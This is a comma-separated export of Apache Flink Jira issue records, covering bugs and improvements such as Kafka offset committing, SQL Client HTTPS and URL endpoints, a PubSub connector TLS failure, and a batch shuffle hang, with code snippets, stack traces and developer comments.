<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,pritam.agarwala,pritam.agarwala,09/May/23 05:28,10/Oct/23 14:37,04/Jun/24 20:41,,1.14.6,,,,,,,,,,,,,,,,,,,,Connectors / Kafka,Runtime / Checkpointing,,,0,,,,"I need to get kafka-lag to prepare a graph and its dependent on kafka committed offset. Flink is updating the offsets only after checkpointing to make it consistent.

Default Behaviour as per doc :
If checkpoint is enabled, but {{consumer.setCommitOffsetsOnCheckpoints}} set to false, then offset will not be committed at all even if the {{enable.auto.commit}} is set to true.

So, when {{consumer.setCommitOffsetsOnCheckpoints}} set to false, *shouldn't it fall back on the {{enable.auto.commit}} to do offset commit regularly since* *in any case flink doesn't use consumer committed offsets for recovery.*

 

OffsetCommitModes class :
  
{code:java}
public class OffsetCommitModes {

    /**
     * Determine the offset commit mode using several configuration values.
     *
     * @param enableAutoCommit whether or not auto committing is enabled in the provided Kafka
     *     properties.
     * @param enableCommitOnCheckpoint whether or not committing on checkpoints is enabled.
     * @param enableCheckpointing whether or not checkpoint is enabled for the consumer.
     * @return the offset commit mode to use, based on the configuration values.
     */
    public static OffsetCommitMode fromConfiguration(
            boolean enableAutoCommit,
            boolean enableCommitOnCheckpoint,
            boolean enableCheckpointing) {

        if (enableCheckpointing) {
            // if checkpointing is enabled, the mode depends only on whether   committing on
            // checkpoints is enabled
            return (enableCommitOnCheckpoint)
                    ? OffsetCommitMode.ON_CHECKPOINTS
                    : OffsetCommitMode.DISABLED;
        } else {
            // else, the mode depends only on whether auto committing is enabled in the provided
            // Kafka properties
            return (enableAutoCommit) ? OffsetCommitMode.KAFKA_PERIODIC : OffsetCommitMode.DISABLED;
        }
    }
}
 {code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,scala,Tue Oct 10 14:37:49 UTC 2023,,,,,,,,,,"0|z1hrr4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"09/May/23 06:38;martijnvisser;OffsetCommitModes is an Internal implementation and shouldn't be used by users. If you want to enable offset committing without checkpointing, it is documented at https://nightlies.apache.org/flink/flink-docs-master/docs/connectors/datastream/kafka/#consumer-offset-committing on how to achieve that;;;","09/May/23 06:52;pritam.agarwala;[~martijnvisser]  I have already gone through it. What I requested here to change this default behaviour : If checkpointing is enabled, then the auto-commit setting is ignored, but the offsets will be committed after checkpointing only.;;;","09/May/23 15:17;wangm92;[~pritam.agarwala]  Do you mean you want use the configuration of `enable.auto.commit` to decide whether to do offset commit when `{{{}consumer.setCommitOffsetsOnCheckpoints`{}}} set to false?;;;","10/May/23 06:44;pritam.agarwala;[~wangm92] yes. Exactly;;;","11/May/23 14:40;martijnvisser;Changing default behavior would be a breaking change for Flink 1.x: I don't think that is something that we should consider. I would still be included to mark this as a Won't do. [~tzulitai] WDYT?;;;","30/May/23 15:23;tzulitai;Hi [~pritam.agarwala], it does look like that the behavior was actually altered / broken when the Kafka source connector was reimplemented on top of the new Source V2 interface.

i.e. the desired behavior that you are describing is exactly how things worked in the old {{{}FlinkKafkaConsumer{}}}. Things changed such that offset committing is only ever done when checkpoint is enabled in the new {{{}KafkaSource{}}}.

Since your ticket description doesn't explicitly mention: could you clarify which version of the Kafka source connector are you using? {{FlinkKafkaConsumer}} or {{{}KafkaSource{}}}?

If it's the latter, I do think there's a case to fix this, as its current behavior conflicts with what the document describes. Since it seems to be a ""bug"", I wouldn't categorize this as ""changing default behavior"". Moreover, not having this behavior added back to {{KafkaSource}} would arguably break existing tooling / integrations if users want to migrate from {{FlinkKafkaConsumer}} to {{{}KafkaSource{}}}. cc [~martijnvisser] ;;;","10/Oct/23 14:37;martijnvisser;[~pritam.agarwala] [~tzulitai] What is the conclusion of this ticket?;;;",,,,,,,,,,,,,,,,
The edge on Web UI is wrong after parallelism changes via parallelism overrides or AdaptiveScheduler ,FLINK-32037,13535449,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,Zhanghao Chen,Zhanghao Chen,09/May/23 03:22,09/May/23 03:32,04/Jun/24 20:41,,1.17.0,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,Runtime / REST,,,0,,,,"*Background*

After FLINK-30213, in case of parallelism changes to the JobGraph, as done via the AdaptiveScheduler or through providing JobVertexId overrides in PipelineOptions#PARALLELISM_OVERRIDES, when the consumer parallelism doesn't match the local parallelism, the original ForwardPartitioner will be replaced with the RebalancePartitioner.

*Problem*

Although the actual partitioner changes to RebalancePartitioner underneath, the ship strategy seen on the Web UI is still FORWARD.

This is because the fix patch applies when we init StreamTask, and the job graph is not touched. Web UI uses the JSON plan generated from the job graph for display, and the ship strategy is get by JobEdge#getShipStrategyName.

*Solution*

The most straightforward way is to reset the job edge's ship strategy name when we change the job vertex's parallelism. But it's a bit tricky. Looking forward to any better suggestions.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-09 03:22:11.0,,,,,,,,,,"0|z1hroo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TableEnvironmentTest.test_explain is unstable on azure ci,FLINK-32036,13535422,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,Sergey Nuyanzin,Sergey Nuyanzin,08/May/23 21:20,18/Aug/23 22:35,04/Jun/24 20:41,,1.17.1,,,,,,,,,,,,,,,,,,,,API / Python,,,,0,auto-deprioritized-critical,test-stability,,"it's failed on ci (1.17 branch so far)
{noformat}
May 07 01:51:35 =================================== FAILURES ===================================
May 07 01:51:35 ______________________ TableEnvironmentTest.test_explain _______________________
May 07 01:51:35 
May 07 01:51:35 self = <pyflink.table.tests.test_table_environment_api.TableEnvironmentTest testMethod=test_explain>
May 07 01:51:35 
May 07 01:51:35     def test_explain(self):
May 07 01:51:35         schema = RowType() \
May 07 01:51:35             .add('a', DataTypes.INT()) \
May 07 01:51:35             .add('b', DataTypes.STRING()) \
May 07 01:51:35             .add('c', DataTypes.STRING())
May 07 01:51:35         t_env = self.t_env
May 07 01:51:35         t = t_env.from_elements([], schema)
May 07 01:51:35         result = t.select(t.a + 1, t.b, t.c)
May 07 01:51:35     
May 07 01:51:35 >       actual = result.explain()
May 07 01:51:35 
May 07 01:51:35 pyflink/table/tests/test_table_environment_api.py:66
{noformat}
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48766&view=logs&j=bf5e383b-9fd3-5f02-ca1c-8f788e2e76d3&t=85189c57-d8a0-5c9c-b61d-fc05cfac62cf&l=25029",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 18 22:35:11 UTC 2023,,,,,,,,,,"0|z1hrio:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"08/May/23 21:24;Sergey Nuyanzin;// cc [~dianfu], [~hxbks2ks];;;","12/Jun/23 11:28;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49702&view=logs&j=9cada3cb-c1d3-5621-16da-0f718fb86602&t=c67e71ed-6451-5d26-8920-5a8cf9651901&l=24547;;;","24/Jul/23 23:24;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=51592&view=logs&j=3e4dd1a2-fe2f-5e5d-a581-48087e718d53&t=b4612f28-e3b5-5853-8a8b-610ae894217a&l=24506;;;","10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Critical but is unassigned and neither itself nor its Sub-Tasks have been updated for 14 days. I have gone ahead and marked it ""stale-critical"". If this ticket is critical, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-critical"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Critical, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,
SQL Client should support HTTPS with built-in JDK certificates,FLINK-32035,13535403,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Implemented,afedulov,afedulov,afedulov,08/May/23 17:41,07/Jul/23 20:02,04/Jun/24 20:41,07/Jul/23 20:02,1.17.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Client,Table SQL / Gateway,,,0,pull-request-available,,,"Related to FLINK-32030 

Internally SQL Client uses  Flink’s _RestClient_ [1].  This client decides whether to enable SSL not on the basis of the URL schema ([https://|https:]...), but based on Flink configuration, namely a global _security.ssl.rest.enabled_  parameter [2] (which is also used for the REST server-side configuration ). When this parameter is set to true, it automatically requires user-supplied  _security.ssl.rest.truststore_  and _security.ssl.rest.keystore_ to be configured - there is no default option to use certificates from JDK. After URL support for SQL Client gateway mode (FLINK-32030) gets added, the SQL Client should automatically use certificates built in into the JDK unless user-supplied trust- and keystores are configured. 


[1] [https://github.com/apache/flink/blob/5dddc0dba2be20806e67769314eecadf56b87a53/flink-table/flink-sql-client/src/main/java/org/apache/flink/table/client/gateway/ExecutorImpl.java#L359]
[2] [https://github.com/apache/flink/blob/5d9e63a16f079399c6b51547284bb96db0326bdb/flink-runtime/src/main/java/org/apache/flink/runtime/rest/RestClientConfiguration.java#L103]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-08 17:41:16.0,,,,,,,,,,"0|z1hreg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Python's DistUtils is deprecated as of 3.10,FLINK-32034,13535386,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,coltenp,coltenp,coltenp,08/May/23 14:23,15/Jun/23 12:16,04/Jun/24 20:41,15/Jun/23 12:16,1.17.0,,,,,,,,,,,,,,1.17.2,1.18.0,,,,,API / Python,,,,0,pull-request-available,,,"I have recent just went through an upgrade from 1.13 to 1.17, along with that I upgraded the python version on our Flink Session server. Most everything that is part of our workflow works, except for Python Dependency Management.

After doing some digging, I found the reason is due to the DeprecationWarning that is printed when trying to get the site packages path. The script is 

GET_SITE_PACKAGES_PATH_SCRIPT and it is executed in the getSitePackagesPath method in the PythonEnvironmentManagerUtils class. The issue is that the DeprecationWarning is included into the PYTHONPATH environment variable which is passed to the beam runner. The deprecation warning breaks Python's ability to find the site packages due to characters that are not allowed in filesystem paths.

 

Example of the PYTHONPATH environment variable:
PYTHONPATH == <string>:1: DeprecationWarning: The distutils package is deprecated and slated for removal in Python 3.12. Use setuptools or check PEP 632 for potential alternatives:/tmp/python-dist-c63e1464-925c-4289-bb71-c6f50e83186f/python-requirements/lib/python3.10/site-packages
HADOOP_CONF_DIR == /opt/flink/conf","Kubernetes

Java 11

Python 3.10.9",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/May/23 15:39;coltenp;get_site_packages_path_script.py;https://issues.apache.org/jira/secure/attachment/13057895/get_site_packages_path_script.py","08/May/23 15:39;coltenp;get_site_packages_path_script_shortened.py;https://issues.apache.org/jira/secure/attachment/13057894/get_site_packages_path_script_shortened.py",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,Patch,,,,,,,,9223372036854775807,,,Java,Thu Jun 15 12:16:06 UTC 2023,,,,,,,,,,"0|z1hrao:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"08/May/23 14:41;coltenp;After digging into the code, and taking a couple of hours to review the alternatives, I believe that I have found a way that would be a good replacement for the GET_SITE_PACKAGES_PATH_SCRIPT code. I have attached the scripts to the ticket. I can also make a branch and commit these.;;;","14/Jun/23 12:43;dianfu;[~coltenp] Thanks for reporting this issue and the finding. Would you like to create a PR for this issue?;;;","14/Jun/23 19:57;coltenp;[~dianfu] - Yep, I sure can do that. PR incoming soon.;;;","14/Jun/23 20:22;coltenp;[~dianfu] - [https://github.com/apache/flink/pull/22782] Here is the link to review. Thanks!;;;","15/Jun/23 12:16;dianfu;Fixed in:
- master via 6ee1912e949cf290e5e1e620b1f4bae6552b428b
- release-1.17 via dd1dde377f775c43fcd95eed1bae91bf5fcfee2e;;;",,,,,,,,,,,,,,,,,,
Resource lifecycle state shows stable even if application deployment goes missing,FLINK-32033,13535384,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,claraxiong,gyfora,gyfora,08/May/23 14:14,08/May/23 15:48,04/Jun/24 20:41,,kubernetes-operator-1.4.0,,,,,,,,,,,,,,,,,,,,Kubernetes Operator,,,,0,,,,"Currently the lifecycle state shows STABLE even if an application deployment was deleted and stays in MISSING / reconciling state. 

We should consider these FAILED as they won't be recovered.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-08 14:14:43.0,,,,,,,,,,"0|z1hra8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade to flink-shaded 17.0,FLINK-32032,13535378,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,martijnvisser,martijnvisser,martijnvisser,08/May/23 13:39,31/Jul/23 11:41,04/Jun/24 20:41,29/Jun/23 11:40,,,,,,,,,,,,,,,1.18.0,,,,,,BuildSystem / Shaded,,,,0,pull-request-available,,,,,,,,,,,,,FLINK-32056,FLINK-31793,,FLINK-30772,,,,,,,,,,FLINK-32678,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 29 11:40:38 UTC 2023,,,,,,,,,,"0|z1hr8w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/Jun/23 11:40;martijnvisser;Fixed in apache/flink:master - d78d52b27af2550f50b44349d3ec6dc84b966a8a;;;",,,,,,,,,,,,,,,,,,,,,,
Flink GCP Connector having issues with Conscrypt library,FLINK-32031,13535362,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,jjayadeep,jjayadeep,jjayadeep,08/May/23 10:31,03/Nov/23 10:59,04/Jun/24 20:41,04/Jul/23 09:08,1.15.4,,,,,,,,,,,,,,gcp-pubsub-3.0.2,gcp-pubsub-3.1.0,,,,,Connectors / Google Cloud PubSub,,,,0,pubsub,pull-request-available,,"When using the current pubsub connector it is not using the latest libraries bom due to which when the connector is used in Cloud Dataproc it is failing with conscrypt related issues.

 
{code:java}
Caused by: repackaged.io.grpc.netty.shaded.io.netty.channel.AbstractChannel$AnnotatedSocketException: Network is unreachable: pubsub.googleapis.com/2607:f8b0:4001:c23:0:0:0:5f:443
Caused by: java.net.SocketException: Network is unreachable
    at java.base/sun.nio.ch.Net.connect0(Native Method)
    at java.base/sun.nio.ch.Net.connect(Net.java:483)
    at java.base/sun.nio.ch.Net.connect(Net.java:472)
    at java.base/sun.nio.ch.SocketChannelImpl.connect(SocketChannelImpl.java:692)
    at repackaged.io.grpc.netty.shaded.io.netty.util.internal.SocketUtils$3.run(SocketUtils.java:91)
    at repackaged.io.grpc.netty.shaded.io.netty.util.internal.SocketUtils$3.run(SocketUtils.java:88)
    at java.base/java.security.AccessController.doPrivileged(Native Method)
    at repackaged.io.grpc.netty.shaded.io.netty.util.internal.SocketUtils.connect(SocketUtils.java:88)
    at repackaged.io.grpc.netty.shaded.io.netty.channel.socket.nio.NioSocketChannel.doConnect(NioSocketChannel.java:315)
    at repackaged.io.grpc.netty.shaded.io.netty.channel.nio.AbstractNioChannel$AbstractNioUnsafe.connect(AbstractNioChannel.java:248)
    at repackaged.io.grpc.netty.shaded.io.netty.channel.DefaultChannelPipeline$HeadContext.connect(DefaultChannelPipeline.java:1342)
    at repackaged.io.grpc.netty.shaded.io.netty.channel.AbstractChannelHandlerContext.invokeConnect(AbstractChannelHandlerContext.java:548)
    at repackaged.io.grpc.netty.shaded.io.netty.channel.AbstractChannelHandlerContext.connect(AbstractChannelHandlerContext.java:533)
    at repackaged.io.grpc.netty.shaded.io.netty.channel.ChannelDuplexHandler.connect(ChannelDuplexHandler.java:54)
    at repackaged.io.grpc.netty.shaded.io.grpc.netty.WriteBufferingAndExceptionHandler.connect(WriteBufferingAndExceptionHandler.java:150)
    at repackaged.io.grpc.netty.shaded.io.netty.channel.AbstractChannelHandlerContext.invokeConnect(AbstractChannelHandlerContext.java:548)
    at repackaged.io.grpc.netty.shaded.io.netty.channel.AbstractChannelHandlerContext.access$1000(AbstractChannelHandlerContext.java:61)
    at repackaged.io.grpc.netty.shaded.io.netty.channel.AbstractChannelHandlerContext$9.run(AbstractChannelHandlerContext.java:538)
    at repackaged.io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:164)
    at repackaged.io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:472)
    at repackaged.io.grpc.netty.shaded.io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:500)
    at repackaged.io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
    at repackaged.io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
    at repackaged.io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
    at java.base/java.lang.Thread.run(Thread.java:829){code}

On disabling ipv6 getting the following error:-
{code:java}
Channel Pipeline: [SslHandler#0, ProtocolNegotiators$ClientTlsHandler#0, WriteBufferingAndExceptionHandler#0, DefaultChannelPipeline$TailContext#0]
    at io.grpc.stub.ClientCalls.toStatusRuntimeException(ClientCalls.java:244)
    at io.grpc.stub.ClientCalls.getUnchecked(ClientCalls.java:225)
    at io.grpc.stub.ClientCalls.blockingUnaryCall(ClientCalls.java:142)
    at com.google.pubsub.v1.SubscriberGrpc$SubscriberBlockingStub.pull(SubscriberGrpc.java:1641)
    at org.apache.flink.streaming.connectors.gcp.pubsub.BlockingGrpcPubSubSubscriber.pull(BlockingGrpcPubSubSubscriber.java:73)
    at org.apache.flink.streaming.connectors.gcp.pubsub.BlockingGrpcPubSubSubscriber.pull(BlockingGrpcPubSubSubscriber.java:77)
    at org.apache.flink.streaming.connectors.gcp.pubsub.BlockingGrpcPubSubSubscriber.pull(BlockingGrpcPubSubSubscriber.java:77)
    at org.apache.flink.streaming.connectors.gcp.pubsub.BlockingGrpcPubSubSubscriber.pull(BlockingGrpcPubSubSubscriber.java:77)
    at org.apache.flink.streaming.connectors.gcp.pubsub.BlockingGrpcPubSubSubscriber.pull(BlockingGrpcPubSubSubscriber.java:67)
    at org.apache.flink.streaming.connectors.gcp.pubsub.PubSubSource.run(PubSubSource.java:128)
    at org.apache.flink.streaming.api.operators.StreamSource.run(StreamSource.java:110)
    at org.apache.flink.streaming.api.operators.StreamSource.run(StreamSource.java:67)
    at org.apache.flink.streaming.runtime.tasks.SourceStreamTask$LegacySourceFunctionThread.run(SourceStreamTask.java:332)
Caused by: javax.net.ssl.SSLHandshakeException: No subjectAltNames on the certificate match
    at org.conscrypt.SSLUtils.toSSLHandshakeException(SSLUtils.java:361)
    at org.conscrypt.ConscryptEngine.convertException(ConscryptEngine.java:1135)
    at org.conscrypt.ConscryptEngine.readPlaintextData(ConscryptEngine.java:1090)
    at org.conscrypt.ConscryptEngine.unwrap(ConscryptEngine.java:867)
    at org.conscrypt.ConscryptEngine.unwrap(ConscryptEngine.java:738)
    at org.conscrypt.Java8EngineWrapper.unwrap(Java8EngineWrapper.java:252)
    at org.conscrypt.Conscrypt.unwrap(Conscrypt.java:605)    {code}
 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jul 03 08:46:48 UTC 2023,,,,,,,,,,"0|z1hr5c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"08/May/23 10:32;jjayadeep;The libraries bom needs to be updated, will submit a PR soon.;;;","03/Jul/23 08:46;martijnvisser;Fixed in:

apache/flink-connector-gcp-pubsub:main 4fdaca7b42969d19bd939c0823afb5372c51461b
apache/flink-connector-gcp-pubsub:v3.0 cba42d81fbe41fcf3687bf2bc243d912e9362ef6;;;",,,,,,,,,,,,,,,,,,,,,
SQL Client gateway mode should accept URLs,FLINK-32030,13535361,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,afedulov,afedulov,afedulov,08/May/23 10:31,16/May/23 16:57,04/Jun/24 20:41,16/May/23 16:57,1.17.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Client,Table SQL / Gateway,,,0,pull-request-available,,,"Currently, the _--endpoint_ parameter has to be specified in the _InetSocketAddress_  format, i.e. _hostname:port._ While this works fine for basic use cases, it does not support the placement of the gateway behind a proxy or using an Ingress for routing to a specific Flink cluster based on the URL path.  I.e. it expects _[some.hostname.com:9001|http://some.hostname.com:9001/]_  to directly serve requests on _[some.hostname.com:9001/v1|http://some.hostname.com:9001/v1]_ . Mapping to a non-root location, i.e. _[some.hostname.com:9001/flink-clusters/sql-preview-cluster-1/v1|http://some.hostname.com:9001/flink-clusters/sql-preview-cluster-1/v1]_  is not supported.
 
Since the client talks to the gateway via its REST endpoint, the right format for the _--endpoint_  parameter is {_}URL{_}, not _InetSocketAddress_ .  


The same _--endpoint_ parameter can be reused if the changes are implemented in a backwards-compatible way.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-08 10:31:04.0,,,,,,,,,,"0|z1hr54:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FutureUtils.handleUncaughtException swallows exceptions that are caused by the exception handler code,FLINK-32029,13535355,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mapohl,mapohl,mapohl,08/May/23 09:18,10/May/23 16:15,04/Jun/24 20:41,10/May/23 16:15,1.16.1,1.17.0,1.18.0,,,,,,,,,,,,1.16.2,1.17.1,1.18.0,,,,Runtime / Coordination,,,,0,pull-request-available,,,I ran into an issue in FLINK-31773 where the passed exception handler relies on the {{leaderContender}} field of the {{DefaultLeaderElectionService}}. This field can become {{null}} with the changes of FLINK-31773. But the {{null}} check was missed in the error handling code. This bug wasn't exposed because {{FutureUtils.handleUncaughtException(..)}} expects the passed error handler callback to be bug-free.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 10 09:58:32 UTC 2023,,,,,,,,,,"0|z1hr3s:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/May/23 09:58;mapohl;master: 88b3432a2845952543a8396aeb8e2cddab77b509
1.17: 1d85f6ffc00789e0239f8ed7164af03b81e8dfae
1.16: 55c748647fdf68050312c08bfaba574a423a8464;;;",,,,,,,,,,,,,,,,,,,,,,
Error handling for the new Elasticsearch sink,FLINK-32028,13535351,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,schulzp,PlugaruT,PlugaruT,08/May/23 08:39,15/Dec/23 09:36,04/Jun/24 20:41,15/Dec/23 09:36,elasticsearch-3.0.0,,,,,,,,,,,,,,elasticsearch-3.1.0,,,,,,Connectors / ElasticSearch,,,,2,pull-request-available,,,"The deprecated ElasticsearchSink supports setting an error handler via a [public method |https://github.com/apache/flink-connector-elasticsearch/blob/8f75d4e059c09b55cc3a44bab3e64330b1246d27/flink-connector-elasticsearch7/src/main/java/org/apache/flink/streaming/connectors/elasticsearch7/ElasticsearchSink.java#L216] but the new sink, does not.

Ideally there would be a way to handle ES specific exceptions and be able to skip items from being retried on ES indefinitely and not block entirely the pipeline.  ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Dec 15 09:36:25 UTC 2023,,,,,,,,,,"0|z1hr2w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/Nov/23 08:29;dcausse;We also have this requirement, some exceptions like ""document missing exception"" are hard to avoid in some conditions (scripted/partial updates), having a way to ignore some of the failed items would be very helpful.;;;","01/Dec/23 12:11;schulzp;I gave it [a try|https://github.com/apache/flink-connector-elasticsearch/pull/83] to come up with a minimal invasive, backwards compatible approach. If was only about the error handling, you could stay in elasticsearch-land and decide to throw or not to throw based on {{BulkRequest}} and {{BulkResponse}}. However, we also needed metrics and this is where I had to bridge between flink-land and elasticsearch-land and allow the newly introduced `BulkRequestInterceptorFactory` to be aware of {{MetricGroup}}. This approach is somewhat tailored to our needs so I would highly appreciate feedback to make it generally applicable.;;;","06/Dec/23 03:23;Weijie Guo;Thanks for taking this, I will take a look at this PR.;;;","15/Dec/23 09:36;Weijie Guo;main via 40774fad0f4ecd1a0d104dcb339e6bb860b0a4bf.;;;",,,,,,,,,,,,,,,,,,,
Batch jobs could hang at shuffle phase when max parallelism is really large,FLINK-32027,13535320,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,Weijie Guo,yunta,yunta,08/May/23 03:17,10/May/23 03:00,04/Jun/24 20:41,10/May/23 03:00,1.16.0,1.16.1,1.17.0,,,,,,,,,,,,1.16.2,1.17.1,1.18.0,,,,Runtime / Network,,,,0,pull-request-available,,,"In batch stream mode with adaptive batch schedule mode, If we set the max parallelism large as 32768 (pipeline.max-parallelism), the job could hang at the shuffle phase:

It would hang for a long time and show ""No bytes sent"":
 !image-2023-05-08-11-12-58-361.png! 

After some time to debug, we can see the downstream operator did not receive the end-of-partition event.
",,,,,,,,,,,,,,,,,,,,,FLINK-28519,,,,,,,,,,,"08/May/23 03:13;yunta;image-2023-05-08-11-12-58-361.png;https://issues.apache.org/jira/secure/attachment/13057871/image-2023-05-08-11-12-58-361.png",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 10 03:00:27 UTC 2023,,,,,,,,,,"0|z1hqw0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"08/May/23 03:18;yunta;[~Weijie Guo] [~zhuzh] Please take a look at this issue.;;;","08/May/23 11:52;Weijie Guo;Thanks [~yunta] for reporting this! 

Through some analysis, [~kevin.cyj] and I found that this is indeed a bug caused by multiple threads moving the {{FileChannel}} of index file simultaneously. I will fix this asap.;;;","09/May/23 04:47;Weijie Guo;Marked this as blocker as this has a probability of causing incorrect job results and will not report an error.;;;","10/May/23 03:00;Weijie Guo;master(1.18) via 63443aec09ece8596321328273c1e431e5029c4d.
release-1.17 via 8e5fb18ae5a80c4d0620979a944b017b203cdeac.
release-1.16 via c5a883d3976fc8367eba446790088ff46e59ab79.;;;",,,,,,,,,,,,,,,,,,,
jdbc-3.1.0-1.16 left join conversion error,FLINK-32026,13535319,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
